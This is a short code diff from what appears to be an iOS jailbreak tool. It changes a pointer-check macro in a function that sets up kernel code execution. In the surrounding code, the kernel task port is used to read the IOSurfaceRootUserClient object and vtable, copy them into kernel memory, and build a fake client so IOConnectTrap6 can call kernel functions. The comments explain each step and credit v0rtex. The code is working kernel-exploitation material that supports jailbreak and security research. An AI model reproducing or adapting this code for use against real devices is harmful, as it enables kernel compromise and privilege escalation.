@@ -50,9 +50,9 @@ bool init_kexecute()
     kernel_task_port = tfp0;
     if (!MACH_PORT_VALID(kernel_task_port)) return false;
     current_task = ReadKernel64(task_self_addr() + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-    if (!ISADDR(current_task)) return false;
+    if (!KERN_POINTER_VALID(current_task)) return false;
     kernel_task = ReadKernel64(GETOFFSET(kernel_task));
-    if (!ISADDR(kernel_task)) return false;
+    if (!KERN_POINTER_VALID(kernel_task)) return false;
     if (!kernel_call_init()) return false;
 #else
     user_client = prepare_user_client();
@@ -60,20 +60,20 @@ bool init_kexecute()
 
     // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
     IOSurfaceRootUserClient_port = get_address_of_port(getpid(), user_client); // UserClients are just mach_ports, so we find its address
-    if (!ISADDR(IOSurfaceRootUserClient_port)) return false;
+    if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_port)) return false;
 
     IOSurfaceRootUserClient_addr = ReadKernel64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // The UserClient itself (the C++ object) is at the kobject field
-    if (!ISADDR(IOSurfaceRootUserClient_addr)) return false;
+    if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_addr)) return false;
 
     uint64_t IOSurfaceRootUserClient_vtab = ReadKernel64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
-    if (!ISADDR(IOSurfaceRootUserClient_vtab)) return false;
+    if (!KERN_POINTER_VALID(IOSurfaceRootUserClient_vtab)) return false;
 
     // The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
     // Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel
 
     // Create the vtable in the kernel memory, then copy the existing vtable into there
     fake_vtable = kmem_alloc(fake_kalloc_size);
-    if (!ISADDR(fake_vtable)) return false;
+    if (!KERN_POINTER_VALID(fake_vtable)) return false;
 
     for (int i = 0; i < 0x200; i++) {
         WriteKernel64(fake_vtable + i * 8, ReadKernel64(IOSurfaceRootUserClient_vtab + i * 8));
@@ -81,7 +81,7 @@ bool init_kexecute()
 
     // Create the fake user client
     fake_client = kmem_alloc(fake_kalloc_size);
-    if (!ISADDR(fake_client)) return false;
+    if (!KERN_POINTER_VALID(fake_client)) return false;
 
     for (int i = 0; i < 0x200; i++) {
         WriteKernel64(fake_client + i * 8, ReadKernel64(IOSurfaceRootUserClient_addr + i * 8));
